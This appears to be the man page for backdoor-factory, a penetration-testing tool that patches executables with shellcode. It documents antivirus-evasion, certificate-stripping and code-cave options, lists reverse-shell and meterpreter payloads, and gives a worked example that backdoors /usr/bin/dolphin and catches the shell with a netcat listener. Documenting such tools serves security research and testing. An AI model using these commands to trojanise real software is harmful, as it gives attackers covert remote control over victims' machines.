BACKDOOR-FACTORY(1)                            May 2017                            BACKDOOR-FACTORY(1)

NAME
       backdoor-factory - inject predefined or user-defined shellcode in binaries

SYNOPSIS
       backdoor-factory [options]

DESCRIPTION
       backdoor-factory patch executable binaries with user desired shellcode and continue normal
       execution of the prepatched state.

       This tool is for security professionals and researchers only.

       This tool doesn't support relocatable ELF executable (i.e. compiled with the -fPIE option,
       suggested by the Debian hardening requirements, see https://wiki.debian.org/Hardening)

       Binaries such as ssh may not be caved correctly, as binaries such as dolphin (at the time of
       this man page is written) are.

OPTIONS:
       -h, --help
         show this help message and exit

       -f FILE, --file=FILE
         File to backdoor

       -s SHELL, --shell=SHELL
         Payloads that are available for use. Use 'show' to see payloads.

       -H HOST, --hostip=HOST
         IP of the C2 for reverse connections.

       -P PORT, --port=PORT
         The port to either connect back to for reverse shells or to listen on for bind shells

       -J, --cave_jumping
         Select this options if you want to use code cave jumping to further hide your shellcode in
       the binary.

       -a, --add_new_section
         Mandating that a new section be added to the exe (better success) but less av avoidance

       -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
         User supplied shellcode, make sure that it matches the architecture that you are targeting.

       -c, --cave
         The cave flag will find code caves that can be used for stashing shellcode. This will print
       to all the code caves of a specific size.The -l flag can be use with this setting.

       -l SHELL_LEN, --shell_length=SHELL_LEN
         For use with -c to help find code caves of different sizes

       -o OUTPUT, --output-file=OUTPUT
         The backdoor output file path. Parent dir(s) must exist

       -n NSECTION, --section=NSECTION
         New section name must be less than seven characters

       -d DIR, --directory=DIR
         This is the location of the files that you want to backdoor. You can make a directory of file
       backdooring faster by forcing the attaching of a codecave to the exe by using the -a setting.

       -w, --change_access
         This flag changes the section that houses the codecave to RWE. Sometimes this is necessary.
       Enabled by default. If disabled, the backdoor may fail.

       -i, --injector
         This command turns the backdoor factory in a hunt and shellcode inject type of mechanism.
       Edit the target settings in the injector module.

       -u SUFFIX, --suffix=SUFFIX
         For use with injector, places a suffix on the original file for easy recovery

       -D, --delete_original
         For use with injector module.  This command deletes the original file.  Not for use in
       production systems.
         (Author not responsible for stupid uses.)

       -O DISK_OFFSET, --disk_offset=DISK_OFFSET
         Starting point on disk offset, in bytes. Some authors want to obfuscate their on disk offset
       to avoid reverse engineering, if you find one of those files use this flag, after you find the
       offset.

       -S, --support_check
         To determine if the file is supported by BDF prior to backdooring the file. For use by itself
       or with verbose. This check happens automatically if the backdooring is attempted.

       -M, --cave-miner
         Future use, to help determine smallest shellcode possible in a PE file

       -q, --no_banner
         Kills the banner.

       -v, --verbose
         For debug information output.

       -T IMAGE_TYPE, --image-type=IMAGE_TYPE
         ALL, x86, or x64 type binaries only. Default=ALL

       -Z, --zero_cert
         Allows for the overwriting of the pointer to the PE certificate table effectively removing
       the certificate from the binary for all intents and purposes.

       -R, --runas_admin
         EXPERIMENTAL Checks the PE binaries for 'requestedExecutionLevel level="highestAvailable"'.
       If this string is included in the binary, it must run as system/admin. If not in Support Check
       mode it will attmept to patch highestAvailable into the manifest if requestedExecutionLevel
       entry exists.

       -L, --patch_dll
         Use this setting if you DON'T want to patch DLLs. Patches by default.

       -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY
         For MACH-O format. If fat file, focus on which arch to patch. Default is x64. To force x86
       use -F x86, to force both archs use -F ALL.

       -B BEACON, --beacon=BEACON
         For payloads that have the ability to beacon out, set the time in secs

       -m PATCH_METHOD, --patch-method=PATCH_METHOD
         Patching methods for PE files, 'manual','automatic', replace and onionduke

       -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY
         For onionduke. Provide your desired binary.

       -X, --xp_mode
         Default: DO NOT support for XP legacy machines, use -X to support XP. By default the binary
       will crash on XP machines (e.g. sandboxes)

       -A, --idt_in_cave
         EXPERIMENTAL By default a new Import Directory Table is created in a new section, by calling
       this flag it will be put in a code cave.  This can cause bianry failure is some cases. Test on
       target binaries first.

       -C, --code_sign
         For those with codesigning certs wishing to sign PE binaries only. Name your signing key and
       private key signingcert.cer and signingPrivateKey.pem respectively in the certs directory it's
       up to you to obtain signing certs.

       -p, --preprocess
         To execute preprocessing scripts in the preprocess directory

ABOUT THE SHELLCODES
       There is various predefined shellcode in backdoor-factory. Their availability depends on the
       target type (ELF32, ELF64, PE32...). The shellcodes list is defined below.

for all intel-based (x86 and x86_64 architecture)
       reverse_shell_tcp
         need: a remote host and port to be set
         permits: remote shell access

       delay_reverse_shell_tcp
         need: a remote host and port to be set
         permits: remote shell access

       beaconing_reverse_shell_tcp
         need: a beacon, a remote host and port to be set
         permits: remote shell access

       user_supplied_shellcode
         need: a user-defined shellcode ready to inject
         permits: depend on the shellcode

Linux specific shellcodes
       reverse_tcp_stager
         need:
         permits:

Windows PE32 exe shellcodes
       reverse_shell_tcp_inline
         needs: a remote host and port to be set
         permits: remote shell access

       reverse_shell_tcp_stager_threaded
         needs: a remote host and port to be set
         permits: Inject the meterpreter server DLL via the Reflective Dll Injection payload

       meterpreter_reverse_https_threaded
         needs: a remote host and port to be set
         permits: meterpreter over https transport

       user_applied_shellcode_threaded
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

       iat_reverse_tcp_inline
         needs: a remote host and port to be set
         permits:

       iat_reverse_tcp_inline_threaded
         needs: a remote host and port to be set
         permits:

       iat_reverse_tcp_stager_threaded
         needs: a remote host and port to be set
         permits: Inject the meterpreter server DLL via the Reflective Dll Injection payload

       iat_user_applied_shellcode_threaded
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

Windows PE64 exe shellcodes
       delay_reverse_shell_tcp
         needs: a remote host and port to be set
         permits: remote shell access

       reverse_shell_tcp
         needs: a remote host and port to be set
         permits: remote shell access

       beaconing_reverse_shell_tcp
         needs:a beacon, a remote host and port to be set
         permits: remote shell access

       user_supplied_shellcode
         needs: a user-defined shellcode ready to inject
         permits: depend on the shellcode

EXAMPLES
       Example of cavecoding an ELF binary, by integrating a remote shell access through a remote TCP
       listener (e.g. netcat):

       backdoor-factory -f /usr/bin/dolphin -H 172.16.0.15 -P 8080 -s reverse_shell_tcp

       On the host behind the IP 172.16.0.15, start netcat in listen mode:

       $ netcat -l 172.16.0.15 8080

       On the target, start the backdoored binary: ./backdoored/dolphin

       Now, on the host 172.16.0.15, just use your shell.

HISTORY
       May 2017, Originally compiled by Philippe Thierry (phil at reseau-libre dot com)

Philippe Thierry                       Backdoor-Factory Man Page                   BACKDOOR-FACTORY(1)
